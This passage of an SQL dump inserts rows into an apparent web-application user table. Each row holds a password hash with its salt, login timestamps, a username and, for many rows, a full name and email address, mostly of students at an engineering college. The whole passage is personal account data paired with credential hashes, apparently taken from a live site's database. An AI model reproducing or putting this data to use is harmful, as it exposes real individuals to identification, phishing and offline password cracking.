12:57:01.237240',0,'20ada38@karpagamtech.ac.in','','','',0,1,'2023-02-07 12:57:00.846508'),(82,'pbkdf2_sha256$260000$r6rPFi6XIDPBqxA2zw46SX$3NQXuJ2b8GaqppzhNiVFMIqR9+qN2wN2icMN5LhLjic=','2023-02-07 16:05:35.131626',0,'10029579','','','',0,1,'2023-02-07 16:05:34.806221'),(73,'pbkdf2_sha256$260000$X3n5gyEp9bUKPxGNfC5a9r$eyuovU4GqDc2zf0imIji7WWZCdrKRO+hC5Mm4nx4NyQ=','2023-01-09 16:55:57.247549',0,'jagadish','','','',0,1,'2023-01-09 16:55:56.926638'),(150,'pbkdf2_sha256$600000$YFJwJnN8T2Sv76yKV0SGdv$5Pdt0Y1HnEJNSAVXzEYC0AkZ29ZwmJ8I+JyFXFrSNMI=','2024-02-18 15:58:07.350394',0,'21ita44','Sanmugam','H M','21ita44@karpagamtech.ac.in',0,1,'2024-01-05 10:48:02.308545'),(75,'pbkdf2_sha256$260000$O9ZMn63yp2rkG2H2bjse2z$t7wT2tAfyKiD0z9ZOkkf+ISoYQHbJ03S7EbdbBKJl/k=','2023-01-12 13:21:44.787341',0,'BmZpLT1S','','','',0,1,'2023-01-12 13:21:44.467504'),(84,'pbkdf2_sha256$260000$5531q8taBtTNy95TtbkVY0$O+hRyDEGfDItxyDx3UaHX8gHyz0LMOrsfyuTZ3QYNZE=','2023-02-11 09:43:11.965901',0,'rawankhedr22@gmail.com','','','',0,1,'2023-02-11 09:43:11.642918'),(78,'pbkdf2_sha256$260000$LQn7zk847tdQ6ImmNOQjGz$V8vrStux1xvdk4iu7vcl3NugArR552JL9wNx4wJBRj8=','2023-01-24 07:43:21.990528',0,'Luha','','','',0,1,'2023-01-24 07:43:21.649867'),(79,'pbkdf2_sha256$260000$HaIopecmfNVL1T06p71kmR$LWUCi1npA/aieSLRobC5wLvYzkQTHpV2+9ENEYEtuwk=','2023-02-04 05:19:03.938110',0,'dharnish@21lcsa02','','','',0,1,'2023-02-04 05:19:03.615839'),(89,'pbkdf2_sha256$260000$VdckJfSHUCsQo9RDEE52wi$IN3YQpsoa7xaaYIP61v4gjVySFZzt+477nv7/2aBc/4=','2023-02-27 14:07:14.283335',0,'suyog','','','',0,1,'2023-02-27 14:07:13.960657'),(90,'pbkdf2_sha256$260000$pZUfBjONP2dWopcsFZqIiG$roVRmpUG4ia7yPhQHHS14ajVuLjiDk1HhuMg1UnZn1M=','2023-02-27 14:07:58.436724',0,'suyogsuyog999@gmail.com','','','',0,1,'2023-02-27 14:07:58.103606'),(91,'pbkdf2_sha256$260000$NBDyWTHEZTkR1rsRFojdxm$9JXXZCmpNBjNbOttusPviUyOwwlmlyxlegdaQxBQS+c=','2023-03-05 03:48:59.806123',0,'farhanmalik3886','','','',0,1,'2023-03-05 03:48:59.475174'),(92,'pbkdf2_sha256$260000$1ChLWuMvcPCJ6l7mSnjpPJ$W186NtifRptPgQnKz9fePUXpC9hxzaleqCLW23ge618=','2023-03-14 16:21:51.409186',0,'jasleenkaur','','','',0,1,'2023-03-14 16:21:51.078075'),(93,'pbkdf2_sha256$600000$Xds3DP8CfkT0zj43wpI4eq$rrKcDa1cLDA2bPT/QD+4xGKRszcpuCqV1bo5xz7hM/s=','2023-10-27 09:43:23.167757',0,'rock_jasir','','','',0,1,'2023-10-27 09:43:22.577816'),(149,'pbkdf2_sha256$600000$UOKVtWbieMPvCUoSuYBea7$QPcnNxeRB4YtZGpkRZvOSuA+znR9oWKw/P/Z0UyjXEI=','2024-02-16 10:27:14.512112',0,'21mea45','VENGATESH ','K','21mea45@karpagamtech.ac.in',0,1,'2024-01-05 10:48:01.765065'),(148,'pbkdf2_sha256$600000$hnCAWKkB2qxgYTmy9zA5tF$VQF62wx7sY0Pbwak1sghHcrYFDni/OHCpm4R83MRWF8=','2024-03-21 08:04:10.108296',0,'21mea20','Kiran','S','21mea20@karpagamtech.ac.in',0,1,'2024-01-05 10:48:01.234004'),(147,'pbkdf2_sha256$600000$lHofdPZTvWWDr8D8Do49u6$7H/k/LgS7RdRMg9g1MapPXYSOv2nFI+zg8Iw3FK0Y6Q=','2024-04-17 08:05:01.629654',0,'21ita17','Jagannathan','A','21ita17@karpagamtech.ac.in',0,1,'2024-01-05 10:48:00.765754'),(98,'pbkdf2_sha256$600000$C5z3TPnMUkwSDVI0lCi3sa$FYFEpLrAfE3OaKMZeoyg6yyLwWetXJh5g8xs2FJ2PKQ=','2023-11-29 14:50:36.075114',0,'muralidharan_1708','','','',0,1,'2023-11-29 14:50:35.189129'),(99,'pbkdf2_sha256$600000$jJKhYvJxFip0EI8mFHJH3t$mrPUZoDWZOBzPNw1ADWT4FUwQj8loJOUMa/tgDorAOo=','2024-05-07 06:23:12.253062',0,'srivanth','','','',0,1,'2023-12-15 16:04:37.167486'),(100,'pbkdf2_sha256$600000$QgMsh9nFmuuQ24snrNRdiu$wlLVvxvTfYKh3kQPTDKiJwim3740AgkX/oZ2+UoORUQ=','2024-01-28 05:47:32.350885',0,'michael9956','','','',0,1,'2023-12-29 16:45:17.203462'),(101,'pbkdf2_sha256$600000$h83OPRClJk0YkEPVCQ3CWF$+AtRuV7X/+IlCFYzUOFkVcEWT7Ab/WigomoIJs2iaS4=','2024-01-01 13:24:25.640639',0,'kavin','','','',0,1,'2024-01-01 13:23:49.877085'),(146,'pbkdf2_sha256$600000$rwVI8csjo51HXx0wCzA6IC$obYAURxs3QGocQquCaOwvTKmvBunJ8wJOeOlgU0jAbw=','2024-02-06 06:39:54.588010',0,'21ita47','Sharulatha','R','21ita47@karpagamtech.ac.in',0,1,'2024-01-05 10:48:00.227155'),(145,'pbkdf2_sha256$600000$DAcXWMKPghVumUCvvtAxb7$F4AECaXTD7nFLBLEhC+1ZF8uSU3KcZxJrCZ+LJ0xhHI=','2024-04-17 08:06:39.574442',0,'21ita30','Mohamed Fayash ','N','21ita30@karpagamtech.ac.in',0,1,'2024-01-05 10:47:59.848001'),(144,'pbkdf2_sha256$600000$rVvs7ZLJsNeDQnJiITrCdW$MmxEnMgzs6geRNSqr0mKDk55CARm/Phn4iURgPWWGxM=','2024-04-17 08:01:53.014033',0,'21ita57','THANGARUPAN','SS','21ita57@karpagamtech.ac.in',0,1,'2024-01-05 10:47:59.483762'),(143,'pbkdf2_sha256$600000$8mcSshLCPTKSeN4KdZru4a$hCgn0tkn9r6Ft2GxX3sZypAv9ASMKTJ2IE77/XY7mVo=','2024-01-20 04:20:36.653010',0,'21eca01','Abhishek kumar','M','21eca01@karpagamtech.ac.in',0,1,'2024-01-05 10:47:59.118756'),(142,'pbkdf2_sha256$600000$7J95Vx8kfRu07pa10ggmaJ$wY6XQDus7fOlLJbiwh2hXvEQuK00KsaYd/V+z4T/RPc=','2024-04-18 03:20:41.894637',0,'21eca17','DHAARANI','M','21eca17@karpagamtech.ac.in',0,1,'2024-01-05 10:47:58.630558'),(141,'pbkdf2_sha256$600000$aRhBRx4iGJMqEfFPJSrl1H$LcgjLZrLwtZjwluYLQvqE1LnKS1fzUUHHSU/e2WI1Tg=','2024-02-14 14:48:28.269321',0,'21ecb29','SANKAR MAHARAJAN ','G','21ecb29@karpagamtech.ac.in',0,1,'2024-01-05 10:47:58.260422'),(140,'pbkdf2_sha256$600000$iOyaUUOHtTQCQWBP0vVQOd$fXnhT6CqUD+Vpbk2XfOAgAEMl3XazswGI5xAFpBGFTo=','2024-05-31 04:49:47.423490',0,'21ECA12','Arunkumar','N S','21eca12@karpagamtech.ac.in',0,1,'2024-01-05 10:47:57.794471'),(139,'pbkdf2_sha256$600000$LxuCV3Kb3G5iBmIfZKOQ4b$C/uNnEOGUQQpDVlzIKwwwTYBQZG/C1vFP8NzMmauXaY=','2024-04-17 08:01:17.441990',0,'21ecb13','Pugazhenthi','S','21ecb13@karpagamtech.ac.in',0,1,'2024-01-05 10:47:57.360736'),(138,'pbkdf2_sha256$600000$YGv3MNYCBYu742AJjwVQc0$T3gn+aPqWTqovS9caOVSRCidN13GMc9jgQU9UR6IL70=','2024-05-31 03:28:01.818512',0,'21ecb59','VISHVA','T','vishva28sep@gmail.com',0,1,'2024-01-05 10:47:56.850851'),(137,'pbkdf2_sha256$600000$7kUJBXy0qtHd7l8P0xrhra$1MSA0ludY3YuaJHaunr0bpuaCm1Ldm/j9sP/XuAKsh8=','2024-02-14 08:22:43.038616',0,'21ecb20','Sabarigirivasan','M','sabarigirivasan05@gmail.com',0,1,'2024-01-05 10:47:56.473843'),(136,'pbkdf2_sha256$600000$Jzod8t0FnXrmWiexRpjB39$mpS4D6lfPls8gynM5VqItRzPMdXn4N3hEXt23aGs4Z8=','2024-01-22 15:22:45.937437',0,'21csa54','Santhosh Ragaventhar ','S','santhoshragaventhar@gmail.com',0,1,'2024-01-05 10:47:56.113912'),(135,'pbkdf2_sha256$600000$Qcfbg81mRQsurD90j9NcGY$BvNtawB7N3AFgd7CTcms/gokkEfI2kSu6gl7ih35MPY=','2024-04-17 10:48:14.275678',0,'21csa28','Keerthana','G','21csa28@karpagamtech.ac.in',0,1,'2024-01-05 10:47:55.591854'),(134,'pbkdf2_sha256$600000$cLHZ0XnIRQyGh6VSMMYESb$hVCsH0wgJLs35qtUeqBNFQED9HkB50QocB3xuZcfpxU=','2024-05-31 06:56:04.635738',0,'21csa19','Hari Govind','S','21csa19@karpagamtech.ac.in',0,1,'2024-01-05 10:47:55.230332'),(133,'pbkdf2_sha256$600000$JJWk5RUiMLeIdCDIOYzUrA$iO4zzT/3bpxyWmbrv3sM2QAFCsMndwSXHp+yIYBwFuk=','2024-04-17 08:03:19.295516',0,'21csa42','Nisar Ahamed','M','21csa42@karpagamtech.ac.in',0,1,'2024-01-05 10:47:54.843925'),(132,'pbkdf2_sha256$600000$PhKAY22UgSMlFMpU1usltA$Xvm50TkBKph7ceZljga+JjOn3wN24G2lM8HNiuzycxk=','2024-04-17 08:02:33.208503',0,'21csa12','BAVITHRARAJ ','M','21csa12@karpagamtech.ac.in',0,1,'2024-01-05 10:47:54.480668'),(131,'pbkdf2_sha256$600000$89WzEoxAwm9cge3kSRLdpV$E6jcsCnNM4c1APbzfSaT88VPioQlzZy81m0KHoYFDDg=','2024-05-14 10:04:32.174825',0,'21csa27','Kaviya','N','21csa27@karpagamtech.ac.in',0,1,'2024-01-05 10:47:54.047443'),(130,'pbkdf2_sha256$600000$ZejmRQ19UbwrZz5qTK58QP$ViVo6vjbNMI9SDf63vOLTq0ImmbND4kP8qGuvhQiIuw=','2024-02-16 10:26:09.916587',0,'21csa36','MITHUN','M','21csa36@karpagamtech.ac.in',0,1,'2024-01-05 10:47:53.680707'),(129,'pbkdf2_sha256$720000$2zTdgErO9J2jFYvPzOKMKP$oGsl56hbzP5PzyQGsudjjfjHLEJmfBv8iwXRS4SKsiA=','2025-03-28 09:22:42.218372',0,'21csa60','Soorya Prasad ','S','21csa60@karpagamtech.ac.in',0,1,'2024-01-05 10:47:53.279762'),(128,'pbkdf2_sha256$600000$4EJMmISkMwRcau4ZUvVdsd$YhC7PtPHvyVjXrnWaCvI6q4dq0MJJZBv9XN5pbuCW9w=','2024-04-18 09:08:01.020457',0,'21ada61','VISHAL','S','21ada61@karpagamtech.ac.in',0,1,'2024-01-05 10:47:52.766325'),(127,'pbkdf2_sha256$600000$J6uyYZ9MQiCNFwxeuacm32$HabsU8JVH+My4EX9kQgYoEf66k8gIx4wTE/eFdMFWHk=','2024-05-31 07:59:38.912210',0,'21ada64','Kavyalaxmi ','L','21ada64@karpagamtech.ac.in',0,1,'2024-01-05 10:47:52.401149'),(151,'pbkdf2_sha256$600000$9OSHKLU2bhNFiEh2OKbea6$7mLBfy07umdfEn0F92SIFxBJiSXxkvmn0wJzvLGTR00=','2024-02-15 16:28:18.100452',0,'21ecb32','Selvakumar','S','21ecb32@karpagamtech.ac.in',0,1,'2024-01-05 10:48:02.686925'),(152,'pbkdf2_sha256$600000$PRAARarnWrk50uIhWPvPVr$e3mtOg6IFaI7y6rfGozzzkR87VFVHPRwdK9cW7ZEkBI=','2024-01-09 18:23:44.151762',0,'kargbomichael8@gmail.com','','','',0,1,'2024-01-09 18:23:43.231830'),(153,'pbkdf2_sha256$600000$vc7WaxHtPTjKlhrqEHA03S$S6C+UHulGyxajIPL7flZbGPXwcKKenLaD70HIZVL2OI=','2024-01-20 06:38:57.471781',0,'uwomobiiv@email1.io','','','',0,1,'2024-01-20 06:38:56.943290'),(154,'pbkdf2_sha256$600000$jCKas7LlqPhpMDfUbSQ7fy$iGyRJl63VFSFuC7DuoB4KE2RGpdfsoIPs8k+DIqiZh0=','2024-01-23 03:30:40.374667',0,'21csa15','Dhanavel','P','21csa15@karpagamtech.ac.in',0,1,'2024-01-20 12:31:17.000000'),(155,'pbkdf2_sha256$600000$K5KvqMQsCFtEGH3AuBf4Lw$qW5udYp2bNe2Xvw/n0a3v0Mg1Rz4ReuG2SPGFKc63S0=','2024-01-20 12:32:30.991146',0,'21ita40@karpagamtech.ac.in','','','',0,1,'2024-01-20 12:32:30.362726'),(156,'pbkdf2_sha256$600000$DY66ryKcaNPCBFMmagWIHO$1n77+9WOmOn56LjpFWMIpUKF6aBynq77YdCu6iace/o=','2024-02-16 01:13:24.025044',0,'21eea29','Nishanth','K','21eea29@karpagamtech.ac.in',0,1,'2024-01-20 15:20:24.417805'),(157,'pbkdf2_sha256$600000$VCmOLqYeLxDr85RSnzCVzI$aq6Ub4ANkb/8g/eWX47u5G8jjifFHfq/egdSuNm/voc=','2024-02-14 15:50:29.389447',0,'21ita45','SARVESHWARA','A','sarveshwaramanjula@gmail.com',0,1,'2024-01-20 15:20:24.744252'),(158,'pbkdf2_sha256$600000$NC7Ohiy7j6BSeCdILjL3qL$gEx8hqynYEIlEE3AHVnraVvjJQm54h0VEKswMEvrHWs=','2024-02-15 04:30:29.337296',0,'21ita43','Sandhiya','K','21ita43@karpagamtech.ac.in',0,1,'2024-01-20 15:20:25.072826'),(159,'pbkdf2_sha256$600000$BdI2p0CAaQaHLjSBKqtSi1$uC8Gp10MTv8d68eX92FHGLor0Amzc7xLx3uL8XyMyzI=','2024-01-29 03:21:47.771308',0,'21ecb18','RITHISHA','A','21ecb18@karpagamtech.ac.in',0,1,'2024-01-20 15:20:25.408421'),(160,'pbkdf2_sha256$600000$hPrv9AYGSYGfXfRY7Icr3N$2M/uHoVv1n74TIfJryV6DNWD6x/U7eRfLF9e66EuaHI=','2024-03-25 09:39:06.792445',0,'21ecb17','RAMYAVARSHINI','A','21ecb17@karpagamtech.ac.in',0,1,'2024-01-20 15:20:25.749059'),(161,'pbkdf2_sha256$600000$BNMiaTGK8z6aSZohS2CpLg$79NFmLyUkQWH1OcKz3hORD7u/9UlVd6wdEuRI9zhsbI=','2024-05-31 16:58:47.701097',0,'21ECA18','DHANUSH','R','21eca18@karpagamtech.ac.in',0,1,'2024-01-20 15:20:26.110835'),(162,'pbkdf2_sha256$600000$3p7r83kPFASpcZJDPniotj$zbCHIrE7jg1UtoWMFc++Ik+6CV7qqaWvzQ39SyGQugs=','2024-02-13 08:00:32.955497',0,'21ecb58','VISHNU KUMAR ','S R','21ecb58@karpagamtech.ac.in',0,1,'2024-01-20 15:20:26.433367'),(163,'pbkdf2_sha256$600000$SBpq9U8DLd1T92Yd3ukT2x$bLnrawYukZl/cFWtbXzNpKw/v/RrUaVjSWjCdMemK64=','2024-02-27 15:36:38.364786',0,'21ada38','Mohanraj','B','t21ada38@karpagamtech.ac.in',0,1,'2024-01-20 15:20:26.759206'),(164,'pbkdf2_sha256$600000$clErnnmzMCkm34gd57ZpuY$KWfH5dQgqRRa55EggxgYGZlZPZECQyCHHwpuDnOY2/E=','2024-06-01 08:12:45.117192',0,'21ita48','SHENBAGAPRIYA','A','21ita48@karpagamtech.ac.in',0,1,'2024-01-20 15:20:27.066981'),(165,'pbkdf2_sha256$600000$OS1J0tkUXPbz0V7T8pkoqA$8+o3O7ggHokq02/S3099ANdX+/apsAxj4Zt8W19mhK8=','2024-02-28 15:30:37.553068',0,'22lita03','MITHRA','N','22lita03@karpagamtech.ac.in',0,1,'2024-01-20 15:20:27.399854'),(166,'pbkdf2_sha256$600000$mZ6JxqAz6ERZoUoTY0nVMr$tAqtL/bb7iW5WIKW/j2g4ld9ZAhKLXpHNxzr0v6fYHg=','2024-02-13 14:48:16.523810',0,'21mea10','Gokul','R','21mea10@karpagamtech.ac.in',0,1,'2024-01-20 15:20:27.705575'),(167,'pbkdf2_sha256$600000$paXC7NTuOvAonya8jnMfjQ$k2EGTqctueGTmrS+kV1XOpJGlrMJcR8B2o6cLxyU6XA=','2024-03-14 05:31:16.237014',0,'21ADA14','DHANUSHKODI','L','21ada14@karpagamtech.ac.in',0,1,'2024-01-20 15:20:28.040366'),(168,'pbkdf2_sha256$600000$930xQ66Wd4EZemex7mKxDo$J9Zv9DQUOWB8+asyRujoJAaZHUmmqkydBDvwO+M32o4=','2024-02-06 08:11:42.710877',0,'21mea04','AKASH','S','21mea04@karpagamtech.ac.in',0,1,'2024-01-20 15:20:28.361769'),(169,'pbkdf2_sha256$600000$zJfwmBoFsPw5hqqLw0hgPV$eV7uxsAtWdbf2O3Wp0bhazlkG3bzBVp2MxS+iiq6NnU=','2024-02-13 08:06:58.292129',0,'21ita50','Sri Deepthi','N','21ita50@karpagamtech.ac.in',0,1,'2024-01-20 15:20:28.662229'),(170,'pbkdf2_sha256$600000$vnD8cFw56FiX50QO4Yl182$cJq0Ut5h/ATT+cX9hsYR/je5G8xtbRLLvOcDil6j9hE=','2024-02-15 04:44:28.937350',0,'21ECA48','KARUPPAIYA','R','ravismart183@gmail.com',0,1,'2024-01-20 15:20:28.956164'),(171,'pbkdf2_sha256$600000$gndK2thNKqaRq3nbz26TDl$EtQbAssskdJ/duqIgF0cLs70XYFw2Sw0gqZqm0bRrWY=','2024-01-22 03:20:59.676084',0,'21csa01','Aadhiseshan','N','21cas01@karpagamtech.ac.in',0,1,'2024-01-20 15:20:29.299348'),(172,'pbkdf2_sha256$600000$7UQLrOZEnCgxHp1umov4zX$aOMtM3n4qJRRi37DNmfydp/4mI75y1+DOYRSPT8J4MY=','2024-02-29 15:50:24.931918',0,'21mea09','ELANGO','D','elangodhandapani8448@gmail.com',0,1,'2024-01-20 15:20:29.904582'),(173,'pbkdf2_sha256$600000$r3H47gC5FwoeTm5zmQPtxP$nTAFYzaetTkHWc8TYLayPy9yNMTBddTzS6kgnky43YQ=','2024-02-06 08:09:55.479641',0,'21ECA33','HARISHWAR','A','21eca33@karpagamtech.ac.in',0,1,'2024-01-20 15:20:30.211074'),(174,'pbkdf2_sha256$600000$YsJsAtRIIr8uIt8CP83GBK$cEhM9NRJhpxpceidBJY6V6ufUSR8pfLPeL7F8pNnb0Y=','2024-05-31 03:45:31.946119',0,'21ECB23','SAKTHIVEL MURUGAN ','S','21ecb23@karpagamtech.ac.in',0,1,'2024-01-20 15:20:30.529600'),(175,'pbkdf2_sha256$600000$7N10l1rktYJazR0tHDf4Dp$fpEA43g36iEkQFGOsb7LnmJ7a0QeLLVILptgOOtWj2w=','2024-02-15 16:28:50.990791',0,'21eea05','Aravind Manikandaraja ','P','aravindamr23@gmail.com',0,1,'2024-01-20 15:20:30.841841'),(176,'pbkdf2_sha256$600000$KLb8uCIMVtgQIWovOT9Ave$8Jt1jTChqRFXpouBJMTqU/GMfBoUexiPG1XJkLi2iIY=','2024-05-31 03:41:31.312578',0,'21ita42','Rajalakshmi','R','21ita42@karpagamtech.ac.in',0,1,'2024-01-20 15:20:31.159586'),(177,'pbkdf2_sha256$600000$yQm3IArR8LNYStB9XuuTUQ$puOWjjDJxKe3Fi0b1a9b3QJovKKIkbY+UNSZI03hvIY=','2024-02-06 08:09:28.548395',0,'21ita16','Hariraj','K','21ita16@karpagamtech.ac.in',0,1,'2024-01-20 15:20:31.488523'),(178,'pbkdf2_sha256$600000$sspovS8Wd3ZAVcscxrLFXh$R7XpyEeYsDdhltHHPbJI/Tf9YH9UmROsGZ6b3RozUuE=','2024-02-13 08:06:38.034022',0,'21eca22','DIVYA','S','21eca22@karpagamtech.ac.in',0,1,'2024-01-20 15:20:31.824651'),(179,'pbkdf2_sha256$600000$zIGKUyvOAeCZow2pcSNCLC$or+3/edgO2Tpls+/Gioo99069p++gTFuiGC+iIWQbao=','2024-02-14 12:22:03.839311',0,'21eca37','ISAI VANAN','R','21eca37@karpagamtech.ac.in',0,1,'2024-01-20 15:20:32.140622'),(180,'pbkdf2_sha256$600000$n4keXa4eGvOSNBxQMiMyAG$LjFCcE6uclEUkfhZ71O+Yv3qH4OadFGGQRZhjNeCh6E=','2024-02-13 08:03:37.328946',0,'21ita46','SATHYA ','R','21ita46@karpagamtech.ac.in',0,1,'2024-01-20 15:20:32.451371'),(181,'pbkdf2_sha256$600000$C1YWqVtihQ5Umy0SHcvZEP$OCDARjxikiCzpV/c8SwTQxRSqJxxfUgzyOg6LjSbm8M=','2024-09-24 03:22:37.241622',0,'21EEA31','NIVETHAN','E','nivethaneswaran@gmail.com',0,1,'2024-01-20 15:20:32.756744'),(182,'pbkdf2_sha256$600000$tRGHmLnQDXRuH2qyP0ucgG$gDTo9F+CC0IgvongKKo9qVZaM7WoSbDsHhtjr1i8ko0=','2024-02-06 08:08:57.379634',0,'21ECA10','AMITHA','S','amithasrini149@gmail.com',0,1,'2024-01-20 15:20:33.076936'),(183,'pbkdf2_sha256$600000$x9o2G2eFdQlwy7ty6GczQF$UhBiOTPTgLlmqlPkokngoTKILR+XbRarMJoGEuYfN60=','2024-02-13 10:29:11.699518',0,'21ita39','Preethi','P','21ita39@karpagamtech.ac.in ',0,1,'2024-01-20 15:20:33.390186'),(184,'pbkdf2_sha256$600000$vwRuYXbNatMk4fy66mlsnL$IRO1lX2yYD9hDt4hSI6gZIjtFA4vpF2FlMNq4CwZ9wE=','2024-03-04 10:16:45.083720',0,'21ECB14','RACHIKA','P','rachikadiva@gmail.com',0,1,'2024-01-20 15:20:33.688846'),(185,'pbkdf2_sha256$600000$d5pK7dBBCsZEhrU4a7IKGj$0KGAHDspsnRv2TJejXAR5i8TK947K22uxSbITw44ia0=','2024-02-15 16:30:28.863539',0,'21eea32','Parthiban','S','parthibanparthiban621@gmail.com',0,1,'2024-01-20 15:20:33.986231'),(186,'pbkdf2_sha256$600000$7VsGtqwcU7TmFIjXSMbK23$p4e4/A5JTRIrVndsUzl5e7XEiKkc1rDcohTVRjJrtI4=','2024-02-14 15:23:58.804442',0,'21ita53','Surendhiran','S','21ita53@karpagamtech.ac.in',0,1,'2024-01-20 15:20:34.283682'),(187,'pbkdf2_sha256$600000$iK2X8NCsM5ypuOHosQGXTR$f9dFf+OVdQx49Y/LsAN+5kzEzlV+eyfDZfMWKv9BXPA=','2024-01-20 15:34:58.317846',0,'21ADA20','Harish','R','21ada20@karpagamtech.ac.in',0,1,'2024-01-20 15:20:34.569503'),(188,'pbkdf2_sha256$600000$60d66wvt5XwG8nRAvMM6Qh$zMoTrXM1OfM5yA6fQsmegKyWLElOYso4V1dk3gKgJ58=','2024-01-27 03:22:35.433356',0,'21csa56','Selva Bharathi ','S','21csa56@karpagamtech.ac.in',0,1,'2024-01-20 15:20:34.859049'),(189,'pbkdf2_sha256$600000$GZ6qjXLyjck5w9oPbtnZuD$On33WLAlPlnlc7TBL3iWRR167xkrH95fSvrsFK3qxtQ=','2024-03-13 05:35:41.658779',0,'21ita37','Prashadh','G','21ita37@karpagamtech.ac.in',0,1,'2024-01-20 15:20:35.166180'),(190,'pbkdf2_sha256$600000$Cmfzp04gEmP2CnQneRbzhs$xSffL3hNlNiLWg4qw6n98gU+PnYraD/KLUbreImv5z0=','2024-02-14 15:11:44.701552',0,'21ita28','Manoj','R','21ita28@karpagamtech.ac.in',0,1,'2024-01-20 15:20:35.465472'),(191,'pbkdf2_sha256$600000$PsLiSNJKnYfPIAfOAXhjzL$XX6NrgyIdz00DF6fR2q/A7S7Gqhh0Cro1L88YcjRYLA=','2024-05-31 04:06:45.849372',0,'21csa40','Murali ','V','21csa40@karpagamtech.ac.in',0,1,'2024-01-20 15:20:35.773054'),(192,'pbkdf2_sha256$600000$oijxKoopylk5BwdXmn66o7$c81Ua5A1V+W7MQCbhzYNs92HvJjIXr/wQVd7EJg9mSw=','2024-01-22 10:06:24.278334',0,'21ita26','MADHUJA','K','21ita26@karpagamtech.ac.in',0,1,'2024-01-20 15:20:36.072100'),(193,'pbkdf2_sha256$600000$wRcwPNcvUC2hR1eqSTEoZo$l4FTUiSuQLhoj0InyoxyeMz8yfAvShJANPDQQhw4h9c=','2024-02-14 15:56:14.752110',0,'21ADA27','Jerin','Don','21ada27@karpagamtech.ac.in',0,1,'2024-01-20 15:20:36.372641'),(194,'pbkdf2_sha256$600000$HtxJznn3vP3PoEI1uyctyO$/x0fBvVlNMsov6zNk38H19cL/hnku5w/L92aqsbd/Og=','2024-01-21 06:32:38.803655',0,'21ecb27','SANJAY','S','sanjaysivakumar2261@gmail.com',0,1,'2024-01-20 15:20:36.683519'),(195,'pbkdf2_sha256$600000$1zeyvy6dwYB79SVTFE9YUB$jT5dnflKqZYlHvrHrS0qBZQwFg9Z/ccEJpEgqLyiIRU=','2024-02-14 17:25:05.878954',0,'21csa48','Roshan','S','21csa48@karpagamtech.ac.in',0,1,'2024-01-20 15:20:37.005476'),(196,'pbkdf2_sha256$600000$Roz2PWCXMf8Yj8g47Csxmv$aN5QZ8/VatiSGx3gQy0r9t4DurYxO0yL1nI7/N5eqwQ=','2024-03-27 10:14:47.310938',0,'21eca51','Kavi Varshini','K','21eca51@karpagamtech.ac.in',0,1,'2024-01-20 15:20:37.315002'),(197,'pbkdf2_sha256$600000$aGJKcSMwotgNLTRJ0Cli7e$d3KopOWQc/8Fnxv23bsma4GMH4ZjIGnDreLdQg7SN8U=','2024-02-06 08:08:42.182029',0,'21ecb06','POOJA','M','21ecb06@karpagamtech.ac.in',0,1,'2024-01-20 15:20:37.628958'),(198,'pbkdf2_sha256$600000$fd5xe8xMleABnSjnoSF9Da$CnejIBn39tX7wFF5nf9ntXtcG3Uul3daR+xUd1BY2a8=','2024-02-14 09:30:14.968470',0,'21ita34','MUHAMMED NADEEM','S','21ita34@karpagamtech.ac.in',0,1,'2024-01-20 15:20:37.946909'),(199,'pbkdf2_sha256$600000$zdVqz8dsDdFZKQEv0PGHrS$XcHuvwP5HJJAjSsohx15a5nEtqoHXjysLo4Jyi2Ryik=','2024-02-06 08:09:33.755941',0,'21ECA19','Dharun Kumar','N','21eca19@karpagamtech.ac.in',0,1,'2024-01-20 15:20:38.251342'),(200,'pbkdf2_sha256$600000$Zteedb8t1ouQnFjwNDKyzE$PfYXo5j55tK/RCD9xetorwlKL0LQFSgtNvtGIgwjsa8=','2024-03-02 14:46:13.469043',0,'21csa16','DIVIT','E G','21csa16@karpagamtech.ac.in',0,1,'2024-01-20 15:20:38.574386'),(201,'pbkdf2_sha256$600000$o7V9MxYefKjpw7XIBLDk4k$Fmfe3tqA+gk2gM7hBGFfXXzLAI/3FT5JLjRNyvVjFlU=','2024-05-31 03:51:50.877638',0,'21EEA54','VIJAYAKANTHAN ','G','vijaykanthan03@gmail.com',0,1,'2024-01-20 15:20:38.883838'),(202,'pbkdf2_sha256$600000$kstlQSRFR3t6KWGAlUuAzo$VKUP+6teuArEwzMkuOPZF0o8eGOd3n+BFwT0Kb/pZ/k=','2024-05-25 10:28:13.782727',0,'21ita32','Mohammed Jamaludeen','H','21ita32@karpagamtech.ac.in',0,1,'2024-01-20 15:20:39.198120'),(203,'pbkdf2_sha256$600000$ppmr6HfYxlGRjv9U8mVjXc$QRROMnb+T8TiZ3ABbs1OCi38egOdGTfB4mG4jeJBB2w=','2024-01-20 15:36:10.237914',0,'21eca08','AKSHAYA SRI ','C','21eca08@karpagamtech.ac.in',0,1,'2024-01-20 15:20:39.514297'),(204,'pbkdf2_sha256$600000$8kDWFtCpqqWU9iuqIiUmx2$pbUAcMKkQLoOCfBEk8g8ur4WVyx8HFXNHvhix7MdCmM=','2024-02-19 10:12:02.547113',0,'21eca43','Jisha Sree','A','jishasree2002@gmail.com',0,1,'2024-01-20 15:20:39.825389'),(205,'pbkdf2_sha256$600000$rAKZvauIsZW0sbo8g3OQOg$TZGIv/hpTnzTonHkAKE0TdsfSr4ME3rg1/NoNoK+Kx0=','2024-05-31 03:36:41.271843',0,'21ecb54','VIGNESH','V S','vigneshvignesh84569@gmail.com',0,1,'2024-01-20 15:20:40.137225'),(206,'pbkdf2_sha256$600000$iJQC9lrUhgoZ9ngaU1u15o$2yY6BQmVib9OsPB9JE5gSbJ4ND3ZHDKXyzL5cDiqiUI=','2024-05-31 03:37:15.100682',0,'21ita10','Dhanusree','S','21ita10@karpagamtech.ac.in',0,1,'2024-01-20 15:20:40.438178'),(207,'pbkdf2_sha256$600000$jhMvLEvqH4vzbLe9rhvXZd$GfEDb4JuJkpiV7jLgB0uKD5/yu/esRdHuh2muCUvaD4=','2024-01-22 14:34:08.593045',0,'21ada52','SANDEEP','G','21ada52@karpagamtech.ac.in',0,1,'2024-01-20 15:20:40.732892'),(208,'pbkdf2_sha256$600000$31ztKm3XFKv4BsCvFdr6Mr$Sf+vTRpeM0lxKRaO4aRB/MUxo0sxEKAT/I4yfcjatEk=','2024-02-14 09:30:34.090133',0,'21ita23','LATHIKA','N','21ita23@karpagamtech.ac.in',0,1,'2024-01-20 15:20:41.027690'),(209,'pbkdf2_sha256$600000$1BOKikHmsfpRAv43yOc9CA$urLlEuBJzjPBM6jX0OD11ZxFDk4uX8REhlmguEQMzgA=','2024-01-20 16:01:01.946527',0,'21eca26','ENIYA','M','21eca26@karpagamtech.ac.in',0,1,'2024-01-20 